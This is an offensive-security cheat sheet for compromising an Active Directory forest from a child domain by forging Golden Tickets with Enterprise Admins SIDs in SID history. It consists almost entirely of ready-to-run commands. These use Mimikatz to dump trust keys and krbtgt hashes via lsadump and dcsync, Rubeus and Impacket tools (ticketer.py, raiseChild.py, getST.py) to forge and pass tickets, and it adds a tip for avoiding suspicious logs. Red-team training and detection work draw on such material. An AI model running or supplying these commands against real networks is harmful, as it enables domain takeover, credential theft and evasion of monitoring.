# Child Domain to Parent Domain - Forest Compromise - extra SIDs (parent/child) (child/parent)

Escalate from a child domain to the root domain of the forest by forging a Golden Ticket with the SID of the Enterprise Admins group in the SID history field.

## With the trust key

### 1) Get the trust key, look at the [in] value in the result

    Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc

OR

    Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\parentDomain$"'

### 2) Forge the referral ticket

    Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:<current_domain_SID> /sids:<enterprise_admins_SID>-<RID> /rc4:<key> /service:krbtgt /target:parentDomain.local /ticket:trust.kirbi"'

### 3) Request an ST with the previous TGT and access service

#New tools for more fun

    .\asktgs.exe trust.kirbi CIFS/dc.parentDomain.local
    .\kirbikator.exe lsa .\CIFS.dc.parentDomain.local.kirbi
    ls \\dc.parentDomain.local\c$

##### Or classically
    
    .\Rubeus.exe asktgs /ticket:trust.kirbi /service:cifs/dc.parentDomain.local /dc:dc.parentDomain.local /ptt
    ls \\dc.parentDomain.local\c$

## With the krbtgt hash

Exactly the same attack, but with the krbtgt hash that can be extracted like this :

    Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

To avoid some suspicious logs, use multiple values can be added in SID History :

    Invoke-Mimikatz -Command '"kerberos::golden /user:dc$ /domain:domain.local /sid:<current_domain_SID> /groups:516 /sids:<parent_domain_SID>-516,S-1-5-9 /krbtgt:<krbtgt_hash> /ptt"'
    Invoke-Mimikatz -Command '"lsadump::dcsync /user:parentDomain\Administrator /domain:parentDomain.local"'


#### 1) Golden Ticket

    Get-DomainSID -Domain DOMAIN (Powerview)

    Get-DomainSID -Domain TARGET_DOMAIN (Powerview)

    mimikatz lsadump::dcsync /domain:DOMAIN /user:DOMAIN\krbtgt

    mimikatz kerberos::golden /user:Administrator /krbtgt:KRBTGT_HASH /domain:DOMAIN /sid:USER_SID /sids:ROOT_DOMAIN_SID-519 /ptt

## OR

    lookupsid.py -domain-sids DOMAIN/USER:'PASSWORD'@DC_IP 0

    ticketer.py -nthash CHILD_KRBTGT_HASH -domain-sid CHILD_SID -domain CHILD_DOMAIN -extra-sid PARENT_DOMAIN_SID-519 goldenuser

## OR

    raiseChild.py DOMAIN/USER:'PASSWORD'

#### 2) inter_realm_ticket TRUST (parent/child) (child/parent)

    mimikatz lsadump::trust /patch

    mimikatz kerberos::golden /user:Administrator /domain:DOMAIN /sid:DOMAIN_SID /aes256:TRUST_KEY_AES256 /sids:TARGET_DOMAIN_SID-519 /service:krbtgt /target:TARGET_DOMAIN /ptt

## OR

    ticketer.py -nthash TRUST_KEY -domain-sid CHILD_SID -domain CHILD_DOMAIN -extra-sid PARENT_DOAMIN_SID-519 -spn krbtgt/PARENT_DOMAIN goldenuser

    getST.py -k -no-pass -spn cifs/DC_FQDN PARENT_DOMAIN/trustfakeuser@PARENT_DOMAIN -debug

### With these attacks, we perform Pass-the-Ticket
